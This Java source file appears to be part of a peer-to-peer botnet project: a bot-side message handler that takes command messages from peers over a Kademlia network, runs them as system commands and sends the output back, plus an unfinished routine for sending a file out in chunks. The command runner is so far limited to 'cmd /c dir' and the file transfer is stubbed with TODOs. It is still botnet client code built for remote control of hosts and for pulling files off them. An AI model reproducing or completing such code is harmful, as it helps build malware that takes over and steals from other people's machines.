package botnet_p2p.business_logic_layer;

import botnet_p2p.model.KademliaPeer;
import botnet_p2p.p2p_layer.P2pLayer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.util.IOUtils;

import java.io.IOException;
import java.io.InputStreamReader;
import java.util.List;

import static botnet_p2p.MessageOuterClass.Message;


class BotMessageHandler {
    private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
    private static final int CHUNK_SIZE = 128;
    private P2pLayer p2pLayer;
    private KademliaPeer me;

    BotMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
        this.p2pLayer = p2pLayer;
        this.me = me;
    }

    void handleCommandMessage(Message message) {
        KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
        Message.CommandMsg command = message.getCommand();

        logger.info("executing command: " + command.getCommandString());
        String result = executeSystemCommand(command.getCommandString());
        boolean success = true;
        if (result == null) {
            result = "";
            success = false;
        }
        if (message.getCommand().getSendResponse()) {
            p2pLayer.commandResponse(sender, me, result, success);
        }
    }

    String executeSystemCommand(String command) {
        if ("dir".equals(command)) {
            try {
                Process exec = Runtime.getRuntime().exec("cmd /c dir");
                exec.waitFor();
                if (exec.exitValue() != 0) {
                    return null;
                }
                InputStreamReader i = new InputStreamReader(exec.getInputStream());
                return IOUtils.toString(i);
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
                return null;
            }
        }
        return null;
    }

    void sendChunkedFile() {
        FileReader fileReader = new FileReader();
        FileReader.ChunkedFile chunkedFile = fileReader.readFile("path", CHUNK_SIZE);

        List<byte[]> chunks = chunkedFile.chunks;
        for (int i = 0; i < chunks.size(); i++) {
            Message.FileChunkMsg fileChunkMsg = Message.FileChunkMsg.newBuilder()
   //                 .setPath() // TODO
   //                 .setName() // TODO
                    .setChunkNumber(i)
                    .setAllChunks(chunks.size()) // TODO
                    // TODO file size ?
                    // TODO UUID pliku
                    .setChunkSize(CHUNK_SIZE)
  //                  .setData(ByteString.copyFrom(chunks.get(i)))
                    .build();
  //          p2pLayer.fileChunk(x, x, fileChunkMsg);
        }

    }
}
